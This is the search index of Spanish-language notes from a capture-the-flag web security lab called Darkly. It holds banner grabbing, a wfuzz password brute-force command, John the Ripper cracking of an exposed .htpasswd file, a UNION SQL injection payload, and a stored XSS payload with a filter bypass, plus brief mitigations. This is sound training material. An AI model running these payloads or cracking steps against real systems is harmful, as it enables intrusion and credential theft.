{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Investigaciones sobre Darkly Intro uso framework OWASP Recopilaci\u00f3n de informaci\u00f3n WSTG-INFO-01 Aqui comenzamos el crawleo de la pagina web - Gospider Fingerprint Web server WSTG-INFO-02 Curl a la aplicacion para pillar back - banner grabbing $ curl <IP> -I HTTP/1.1 200 OK Server: nginx/1.4.6 (Ubuntu) Date: Fri, 06 Jun 2025 11:42:57 GMT Content-Type: text/html Connection: keep-alive X-Powered-By: PHP/5.5.9-1ubuntu4.29 Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Fri, 06-Jun-2025 12:42:57 GMT; Max-Age=3600 Tenemos el proxy, el sistema y el framework usado. Tambien vemos una cabecera Set-Cookie que nos va a (./cookie_tampering.md)[resultar interesante] en un futuro. nmap Descubrimiento de servicios Fuzzeando la aplicaci\u00f3n web robots.txt","title":"Home"},{"location":"#investigaciones-sobre-darkly","text":"Intro uso framework OWASP","title":"Investigaciones sobre Darkly"},{"location":"#recopilacion-de-informacion","text":"WSTG-INFO-01 Aqui comenzamos el crawleo de la pagina web - Gospider","title":"Recopilaci\u00f3n de informaci\u00f3n"},{"location":"#fingerprint-web-server","text":"WSTG-INFO-02 Curl a la aplicacion para pillar back - banner grabbing $ curl <IP> -I HTTP/1.1 200 OK Server: nginx/1.4.6 (Ubuntu) Date: Fri, 06 Jun 2025 11:42:57 GMT Content-Type: text/html Connection: keep-alive X-Powered-By: PHP/5.5.9-1ubuntu4.29 Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Fri, 06-Jun-2025 12:42:57 GMT; Max-Age=3600 Tenemos el proxy, el sistema y el framework usado. Tambien vemos una cabecera Set-Cookie que nos va a (./cookie_tampering.md)[resultar interesante] en un futuro. nmap","title":"Fingerprint Web server"},{"location":"#descubrimiento-de-servicios","text":"","title":"Descubrimiento de servicios"},{"location":"#fuzzeando-la-aplicacion-web","text":"","title":"Fuzzeando la aplicaci\u00f3n web"},{"location":"#robotstxt","text":"","title":"robots.txt"},{"location":"brute_force/","text":"wfuzz -w rockyou.txt \"http://192.168.1.66/index.php?page=signin&username=admin&password=FUZZ&Login=Login#\" curl https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -L -o rockyou.txt 1988 hh es shadow","title":"Brute force"},{"location":"hidden/","text":"Hidden form parameter Pues tenemos opcion de recuperar contrase\u00f1a en el signin. Damos a submit, y vemos un payload que no hemos metido. Inspeccionamos elemento, vemos un input hidden en el formulario. Editamos el input de mail, submiteamos, por algun motivo nos da una flag.","title":"Hidden form parameter"},{"location":"hidden/#hidden-form-parameter","text":"Pues tenemos opcion de recuperar contrase\u00f1a en el signin. Damos a submit, y vemos un payload que no hemos metido. Inspeccionamos elemento, vemos un input hidden en el formulario. Editamos el input de mail, submiteamos, por algun motivo nos da una flag.","title":"Hidden form parameter"},{"location":"htpasswd/","text":"Explotaci\u00f3n archivo htpasswd Exfiltrado por robots.txt, archivo htpasswd. .htpasswd, credenciales de apache que por algun motivo se encuentran aqui. (definicion htpasswd) Lanzamos un john. apt update && apt install -y git build-essential libssl-dev zlib1g-dev yasm git clone https://github.com/openwall/john -b bleeding-jumbo john-jumbo cd john-jumbo/src ./configure && make -s clean && make -sj$(nproc) curl http://<ip>/whatever/httpaswd -o htpasswd curl https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt ./john --format=raw-md5 --wordlist=rockyou.txt ./htpasswd Son credenciales de admin, pues nos intentamos loggear como admin.","title":"Explotaci\u00f3n archivo htpasswd"},{"location":"htpasswd/#explotacion-archivo-htpasswd","text":"Exfiltrado por robots.txt, archivo htpasswd. .htpasswd, credenciales de apache que por algun motivo se encuentran aqui. (definicion htpasswd) Lanzamos un john. apt update && apt install -y git build-essential libssl-dev zlib1g-dev yasm git clone https://github.com/openwall/john -b bleeding-jumbo john-jumbo cd john-jumbo/src ./configure && make -s clean && make -sj$(nproc) curl http://<ip>/whatever/httpaswd -o htpasswd curl https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt ./john --format=raw-md5 --wordlist=rockyou.txt ./htpasswd Son credenciales de admin, pues nos intentamos loggear como admin.","title":"Explotaci\u00f3n archivo htpasswd"},{"location":"sql_injection_images/","text":"1 or 1=1 union select title, comment from list_images ID: 1 or 1=1 union select title, comment from list_images Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 Url : Hack me ?","title":"Sql injection images"},{"location":"sql_injection_users/","text":"Inyecci\u00f3n SQL - Usuarios","title":"SQL injection"},{"location":"sql_injection_users/#inyeccion-sql-usuarios","text":"","title":"Inyecci\u00f3n SQL - Usuarios"},{"location":"web_crawling/","text":"","title":"Web Crawling"},{"location":"web_parameter_tampering/","text":"","title":"Web parameter tampering"},{"location":"web_scrapping/","text":"docker run --rm -v ./crawler.py:/crawler.py python sh -c \"pip install requests bs4; python crawler.py http://192.168.1.66/.hidden/\"","title":"Web scrapping"},{"location":"xss_injection/","text":"Inyecci\u00f3n XSS (Stored XSS) Reconocimiento Identificaci\u00f3n de la vulnerabilidad La validaci\u00f3n de tama\u00f1o m\u00e1ximo del nombre s\u00f3lo se encuentra en front, por lo que podemos bypassearla. document.querySelector('input').maxLength = 1000 Probamos a inyectar un tag <script type=\"text/javascript\"></script> Y observamos que en el comentario resultante se filtra la palabra javascript, por lo que bypasseamos escapando uno de los caracteres, por ejemplo &#106; . Nuestro payload final: <div> User <script type=\"text/&#106avascript\">alert(\"Hey\")</script></div> Lo introducimos en el input de usuario, guardamos y refrescamos la p\u00e1gina, y ya podemos ejecutar c\u00f3digo en navegadores remotos. Para obtener la flag, simplemente hemos de escribir script en el input del nombre y enviar. Mitigaci\u00f3n Validaci\u00f3n de input de usuario en servidor. Escape de caracteres especiales (html) en servidor. Referencias https://owasp.org/www-community/attacks/xss/","title":"Inyecci\u00f3n XSS"},{"location":"xss_injection/#inyeccion-xss","text":"(Stored XSS) Reconocimiento Identificaci\u00f3n de la vulnerabilidad La validaci\u00f3n de tama\u00f1o m\u00e1ximo del nombre s\u00f3lo se encuentra en front, por lo que podemos bypassearla. document.querySelector('input').maxLength = 1000 Probamos a inyectar un tag <script type=\"text/javascript\"></script> Y observamos que en el comentario resultante se filtra la palabra javascript, por lo que bypasseamos escapando uno de los caracteres, por ejemplo &#106; . Nuestro payload final: <div> User <script type=\"text/&#106avascript\">alert(\"Hey\")</script></div> Lo introducimos en el input de usuario, guardamos y refrescamos la p\u00e1gina, y ya podemos ejecutar c\u00f3digo en navegadores remotos. Para obtener la flag, simplemente hemos de escribir script en el input del nombre y enviar.","title":"Inyecci\u00f3n XSS"},{"location":"xss_injection/#mitigacion","text":"Validaci\u00f3n de input de usuario en servidor. Escape de caracteres especiales (html) en servidor.","title":"Mitigaci\u00f3n"},{"location":"xss_injection/#referencias","text":"https://owasp.org/www-community/attacks/xss/","title":"Referencias"}]}